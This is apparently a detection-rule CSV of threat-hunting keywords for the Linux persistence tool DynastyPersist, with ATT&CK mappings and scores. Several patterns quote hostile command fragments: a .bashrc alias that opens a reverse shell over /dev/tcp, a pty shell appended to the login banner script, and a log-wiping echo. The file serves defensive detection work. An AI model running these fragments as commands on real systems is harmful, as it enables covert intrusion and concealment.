"keyword","metadata_keyword_regex","metadata_keyword_type","metadata_tool","metadata_description","metadata_tool_techniques","metadata_tool_tactics","metadata_malwares_name","metadata_groups_name","metadata_category","metadata_link","metadata_enable_endpoint_detection","metadata_enable_proxy_detection","metadata_comment","metadata_severity_score","metadata_popularity_score","metadata_github_stars","metadata_github_forks","metadata_github_updated_at","metadata_github_created_at"
"*/var/www/html/dynasty_rce*","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","1","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*[+] - Bashrc persistence added!*","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","0","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*[+] - Configuring ~/.bashrc for persistence ... *","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","0","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*[+] - Linux header / Message Of The Day Persistence*","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","0","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*[+] - Rootkit Configuration*","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","0","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*[+] - Rootkit configured successfully*","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","0","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*[+] - Setting up cronjobs for persistence ... *","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","0","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*[+] - Systemd Root Level Service successfully configued!*","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","0","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*[+] Success! LD_PRELOAD has been added!*","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","0","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*\DynastyPersist\src\*.sh*","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","0","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*<title>Dynasty Persist</title>*","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","0","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*D Y N A S T Y  - P E R S I S T*","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","0","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*dynasty_rce/rce.php*","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","1","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*DynastyPersist-main.zip*","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","1","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*echo ""Nothing to see here ... "" > /var/log/kern.log*","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","0","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*echo 'alias cat=/bin/bash -c 'bash -i >& /dev/tcp/*/* 0>&1'' >> */.bashrc* ","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","0","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*echo 'find cat=/bin/bash -c 'bash -i >& /dev/tcp/*/* 0>&1'' >> */.bashrc* ","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","0","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*ExecStartPre present! ExecStartPre was modified!*","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","0","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*https://github.com/m0nad/Diamorphine*","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","0","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*LDPreloadPrivesc*","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","0","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*Made by: @Trevohack | @opabravo | @matheuz*","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","0","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*Modified by: Trevohack aka *SpaceShuttleIO*","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","0","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*php -S 0.0.0.0:9056 &*","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","0","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*pty.spawn(""/bin/sh""* >> /etc/update-motd.d/00-header*","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","0","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*spaceshuttle.io.all@gmail.com*","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","0","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
"*Trevohack/DynastyPersist*","N/A","offensive_tool_keyword","DynastyPersist","Linux persistence tool with features like SSH Key Generation -  Cronjob Persistence -  Custom User with Root -  RCE Persistence -  LKM/Rootkit-  Bashrc Persistence -  Systemd Service for Root -  LD_PRELOAD Privilege Escalation Config -  Backdooring Message of the Day / Header   and Modifying an Existing Systemd Service","T1055 - T1037 - T1078 - T1547 - T1546 - T1556","TA0003 - TA0004 - TA0005","N/A","N/A","Persistence","https://github.com/Trevohack/DynastyPersist","1","1","N/A","9","2","118","10","2024-01-27T12:07:18Z","2023-08-13T15:05:42Z"
